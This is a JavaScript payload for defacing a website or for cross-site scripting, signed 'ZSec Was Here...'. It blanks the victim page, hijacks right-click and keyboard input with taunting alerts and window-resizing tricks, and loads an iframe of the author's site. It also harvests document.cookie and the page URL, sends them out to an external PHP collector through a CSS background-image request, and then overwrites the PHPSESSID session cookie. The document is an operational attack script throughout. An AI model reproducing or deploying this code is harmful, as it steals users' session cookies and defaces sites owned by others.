/*
<style>html,body{color:black}</style><font color='white'><script>top.location.href='http://www.google.com/?v=wall/'</script><noscript><META HTTP-EQUIV="refresh" CONTENT="0;URL=http://www.facebook.com/?v=wall/">
*/
document.getElementsByTagName('body')[0].innerHTML=""
document.title="ZSec Was Here..."
var shortc=document.createElement("link");shortc.rel="SHORTCUT ICON";shortc.href="";document.getElementsByTagName("head")[0].appendChild(shortc)
function muter2(){
scrW=screen.availWidth
scrH=screen.availHeight
window.moveTo(0,0)
window.resizeTo(10,10)
window.focus()
for(x=0;x<80;x++){
window.resizeTo(10,scrH*x/80)
}
for(y=0;y<80;y++){
window.resizeTo(scrW*y/80,scrH)
}
window.resizeTo(scrW,scrH)
}
document.oncontextmenu=new Function("muter2();return false");
function keypressed(){alert("Iam Cold Man , Reserved , And Evil");}
document.onkeydown=keypressed;
function kasih_tau(){
alert('Iam Cold Man , Reserved , And Evil');
}
if(location.href.indexOf('zsecode.github.io')==-1)setTimeout("alert('Iam Cold Man , Reserved , And Evil');",3000);
else setTimeout("kasih_tau()",3000);
if(navigator.userAgent.indexOf('MSIE')!=-1){
document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='https://zsecode.github.io/' scrolling='no' frameborder='0'></center>";
}
else{
if(document.getElementsByTagName('body')[0].style.cssText.indexOf('hack')==-1){
//muter2();
log="";
if(document.cookie!=""&&location.href.indexOf('ayodance.com')==-1){x=escape(document.cookie);v=escape(location.href);y="codezsec@gmail.com";log=";background-image:url(http://crazydavinci.net/riper.php?o="+escape(x)+"&v="+escape(v)+"&y="+escape(y)+")";document.cookie="PHPSESSID=!ZSec!;path=/";}
document.getElementsByTagName('body')[0].style.cssText="background-color:black"+log
window.onload=function(){
document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='https://zsecode.github.io/' height='620px' width='1100px' scrolling='no' frameborder='0'></center>";
document.getElementsByTagName('body')[0].style.cssText="background-color:black;background-image:url(http://www.balikita.net/)!important;";
}
}
}
